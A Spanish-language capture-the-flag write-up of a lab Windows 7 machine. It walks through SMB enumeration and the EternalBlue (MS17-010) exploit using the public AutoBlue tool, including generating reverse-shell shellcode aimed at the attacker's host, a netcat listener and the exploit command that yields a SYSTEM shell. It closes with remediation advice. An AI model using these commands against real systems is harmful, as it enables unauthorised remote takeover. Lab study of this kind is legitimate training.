---
layout: post
title: "Microchoft - The Hacker Labs - Windows"
date: 2026-07-17
img: /assets/img/windows/microchoft/banner.png
tags: [Windows, Enumeration, Robots, MS17-010, EternalBlue]
---


# Reconocimiento 
Comenzamos con un reconocimiento de puertos y servicios de la máquina objetivo. Utilizaré la herramienta **Auto-Recon** que me ayuda a realizar este proceso de forma automática, liberándome tiempo para enfocarme en otros procesos..

![](/secnotes/assets/img/windows/microchoft/Pasted image 20260717221204.png)

![](/secnotes/assets/img/windows/microchoft/Pasted image 20260717221231.png)

![](/secnotes/assets/img/windows/microchoft/Pasted image 20260717221537.png)

El resultado nos muestra los puertos:
	**135 msrpc**
	**139 netbios-ssn**
	**445 microsoft-ds**
Esto nos confirma que estamos ante un entorno de Windows clásico.

Los puertos altos corresponden a puertos RPC dinámicos del sistema.

## Análisis de la Superficie de Ataque.

- **Puerto 135 (MSRPC)**: Este corresponde al servicio de llamada a procedimiento remoto. Sirve para que diferentes procesos de Windows se comuniquen entre sí o con otras máquinas. 
- **Puerto 139 (NetBIOS) y Puerto 445 (SMB):** El "Server Message Block" es el protocolo que usa Windows para compartir archivos e impresoras. 

### Reconocimiento SMB

Dado que el servicio SMB esta expuesto, el objetivo será comprobar si podemos revisar la versión exacta del servicio y ver si podemos obtener información adicional. Para esto, utilizaremos la herramienta `crackmapexec`.

`carckmapexec smb 192.168.192.166 --shares`

![](/secnotes/assets/img/windows/microchoft/Pasted image 20260717223509.png)

```
┌──(yorve㉿SecNotes)-[~/Desktop]
└─$ crackmapexec smb 192.168.192.166 --shares
SMB         192.168.192.166 445    MICROCHOFT       [*] Windows 7 Home Basic 7601 Service Pack 1 x64 (name:MICROCHOFT) (domain:Microchoft) (signing:False) (SMBv1:True)
```

Y el resultado fue información de interés:

- `Windows 7 Home Basic 7601 Service Pack 1 x64`: Estamos frente a un sistema operativo obsoleto y propenso a exploits de vulnerabilidades públicas.

- `SMBv1: True`: Protocolo obsoleto y vulnerable

- `singning: False`: El firmado de SMB esta desactivado. Esto nos permitiría ataques de retransmisión (SMB Relay)

### Vector de ataque.

El sistema operativo Windows 7 con SMBv1 es la combinación exacta que hace un sistema vulnerable al famoso **EternalBlue (MS17-010)**, el exploit desarrollado por NSA que se filtró en el 2017 y que permitía la ejecución remota de código con los máximos privilegios.

**Prueba de Vulnerabilidad con Nmap**

Como ya sabemos, Nmap cuenta con un script especifico que nos ayudará a comprobar si la máquina es vulnerable a **EternalBlue**

`nmap 192.168.192.166 -p 445 --script smb-vuln-ms17-010`

![](/secnotes/assets/img/windows/microchoft/Pasted image 20260717224451.png)

Ya tenemos confirmado que la máquina es vulnerable.

### EternalBlue Ms17-010.

En palabras sencillas, este es un fallo de corrupción de memoria. El problema ocurre en la forma en que el driver del sistema de Windows (`srv.sys`) procesa ciertos paquetes modificados del protocolo **SMBv1.**

Cuando enviamos un paquete con un tamaño falsificado, el servidor sufre un desbordamiento de búfer (Buffer Overflow). Esto significa que los datos se desbordan de la memoria asignada y entra en zonas donde no deberían estar. El exploit aprovecha este caos para inyectar código en la memoria del sistema y obligar al procesador de windows a ejecutarlo con los privilegios más altos posibles(`NT AUTHORITY\SYSTEM`).

## Explotación.

 Para no tener problemas con las librerías de Python, nos crearemos un entorno virtual.
 
 `python3 -m venv venv`

y lo activaremos 

` source venv/bin/activate `

utilizaremos la herramienta `AutoBlue` para ganar acceso a la máquina objetivo 

`git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git`

Instalamos las dependencias necesarias 

`pip3 install -r requirements.txt`

En el directorio _shellcode_, existe un archivo que nos ayudará a crear el archivo .bin necesario. Primero debemos darle permisos de ejecución y nos hará un par de preguntas.


![](/secnotes/assets/img/windows/microchoft/Pasted image 20260717231933.png)
![](/secnotes/assets/img/windows/microchoft/Pasted image 20260717231951.png)

Las respuestas que debemos poner son:

1. **LHOST:** Nuestra IP de atacante
2. **LPORT para x64:** 443
3. **LPORT para x86:** 444 (Aunque no lo usaremos)
4. **Type of shell:** 1 (`regular cmd shell`)
5. **Type of payload:** 1 (`staged`)

al terminar, el script nos creará un archivo llamado `sc_x64.bin` dentro del mismo directorio.

Ya que tenemos todo listo, volvemos al directorio donde tenemos los script y lanzamos el exploit utilizando el nuevo archivo que creamos.

**Nota** : Recordar poner netcat en escucha en el puerto que configuramos (443)

`python3 eternalblue_exploit7.py 192.168.192.166 shellcode/sc_x64.bin` 

y al ejecutar obtenemos una shell con privilegios de `nt authority\system` (El máximo)

![](/secnotes/assets/img/windows/microchoft/Pasted image 20260717232508.png)


## Conclusiones

La resolución de esta máquina demuestra de forma practica el riesgo de tener sistemas operativos obsoletos (aunque en pleno 2026 es difícil encontrarse con ellos en entornos de producción).

Al abusar de un fallo de desbordamiento de búfer en el manejo de paquetes SMB por parte del kernel, logramos inyectar un shellcode personalizado que nos otorgó acceso remoto directo con los máximos privilegios del sistema, omitiendo la necesidad de credenciales válidas o escala de privilegios posterior.

La remediación de este vector de ataque no requiere configuraciones complejas. Se soluciona aplicando los parches de seguridad críticos correspondientes o, idealmente, dehabilitando el protocolo SMBv1 y migrarlo a sistemas operativos con soporte vigente.
